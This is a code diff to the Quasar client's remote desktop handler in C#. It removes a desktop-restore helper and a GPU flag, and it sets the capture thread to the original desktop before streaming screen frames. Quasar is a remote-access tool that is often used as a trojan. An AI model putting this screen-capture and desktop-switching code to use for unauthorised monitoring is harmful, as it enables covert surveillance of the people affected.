@@ -14,8 +14,8 @@ using System.Diagnostics;
 using Quasar.Common.Messages.Monitoring.RemoteDesktop;
 using Quasar.Common.Messages.other;
 using System.Collections.Concurrent;
-using Quasar.Client.Config;
 using System.Runtime.InteropServices;
+using Quasar.Client.Config;
 
 namespace Quasar.Client.Messages
 {
@@ -31,8 +31,6 @@ namespace Quasar.Client.Messages
         private ISender _clientMain;
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
-
-        private bool _useGpu = false;
 
         // frame control variables
         private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
@@ -91,44 +89,9 @@ namespace Quasar.Client.Messages
             }
         }
 
-        private static void RestoreOriginalDesktop()
-        {
-            Debug.WriteLine($"Attempting to restore desktop with handle: {Settings.OriginalDesktopPointer}");
-
-            if (Settings.OriginalDesktopPointer == IntPtr.Zero)
-            {
-                Debug.WriteLine("ERROR: Original desktop pointer is null/zero");
-                return;
-            }
-
-            bool success = SetThreadDesktop(Settings.OriginalDesktopPointer);
-            int errorCode = Marshal.GetLastWin32Error();
-
-            if (!success)
-            {
-                Debug.WriteLine($"Failed to restore original desktop. Error code: {errorCode}");
-
-                // Common error codes and their meanings
-                if (errorCode == 170) // ERROR_BUSY
-                    Debug.WriteLine("Error: The desktop is currently in use");
-                else if (errorCode == 1400) // ERROR_INVALID_WINDOW_HANDLE
-                    Debug.WriteLine("Error: Invalid desktop handle");
-                else if (errorCode == 5) // ERROR_ACCESS_DENIED
-                    Debug.WriteLine("Error: Access denied - thread might not have permission");
-            }
-            else
-            {
-                Debug.WriteLine("Successfully restored original desktop");
-            }
-        }
-
         private void StartScreenStreaming(ISender client, GetDesktop message)
         {
             Debug.WriteLine("Starting remote desktop session");
-
-            ScreenHelperCPU.InitializeCaptureThread();
-
-            _useGpu = message.UseGPU;
 
             var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
             var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
@@ -209,6 +172,13 @@ namespace Quasar.Client.Messages
         {
             Debug.WriteLine("Starting buffered capture loop");
             _stopwatch.Start();
+
+            bool success = SetThreadDesktop(Settings.OriginalDesktopPointer);
+            if (!success)
+            {
+                Debug.WriteLine($"Failed to set capture thread to original desktop: {Marshal.GetLastWin32Error()}");
+                return;
+            }
 
             while (!cancellationToken.IsCancellationRequested)
             {
